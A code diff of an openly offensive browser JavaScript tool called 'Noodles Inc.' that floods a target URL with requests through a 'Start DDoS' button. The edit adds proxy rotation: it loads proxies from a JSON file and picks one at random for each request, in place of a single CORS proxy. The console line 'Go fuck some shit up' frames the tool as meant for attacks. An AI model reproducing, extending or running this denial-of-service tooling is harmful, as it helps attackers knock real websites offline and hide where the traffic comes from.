@@ -86,7 +86,9 @@ const getTargetURL = async () => {
 
 // Function to bypass CORS using a proxy
 const bypassCORS = async (url) => {
-    const proxyURL = `https://corsproxy.io/?${encodeURIComponent(url)}`;
+	const proxyList = await fetch('/public/main/proxies.json').then(res => res.json());
+    const proxy = proxyList.proxies[Math.floor(Math.random() * proxyList.proxies.length)];
+    const proxyURL = `${proxy.url}${encodeURIComponent(url)}`;
     try {
         const response = await fetch(proxyURL, {
             mode: 'cors'
@@ -311,7 +313,7 @@ if (isNaN(durationDDoS) || durationDDoS <= 0) {
     durationDDoS = 60;
 }
 
-const proxyListURLDDoS = prompt("%cEnter URL to proxy list (HTTP/S only, one proxy per line):", "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", "color: #008000"); // Using a real proxy list
+const proxyListURLDDoS = '/public/main/proxies.json'; // Using a real proxy list
 
 const startButton = document.createElement("button");
 startButton.textContent = "Start DDoS";
@@ -357,8 +359,8 @@ const loadProxies = async () => {
     try {
         log("Loading proxies...");
         const response = await fetch(proxyListURLDDoS);
-        const proxyData = await response.text();
-        proxies = proxyData.split('\n').map(p => p.trim()).filter(p => p !== '');
+		const proxyData = await response.json();
+        proxies = proxyData.proxies.map(p => p.url.trim()).filter(p => p !== '');
         log(`Loaded ${proxies.length} proxies.`);
     } catch (error) {
         log(`Error loading proxies: ${error}`);
@@ -390,7 +392,7 @@ const attack = async () => {
 
         if (proxy) {
             log(`Using proxy: ${proxy}`);
-            requestURL = `https://corsproxy.io/?${encodeURIComponent(targetURLDDoS)}`;
+            requestURL = `${proxy}${encodeURIComponent(targetURLDDoS)}`;
         }
 
         log("Sending request...");
@@ -706,3 +708,4 @@ const saveReport = () => {
 saveReportButton.addEventListener('click', saveReport);
 
 console.log("%cNoodles Inc. loaded. Go fuck some shit up. Responsibly, of course...", "color: #008000; font-size: 16px;");
+edit: Added proxy support
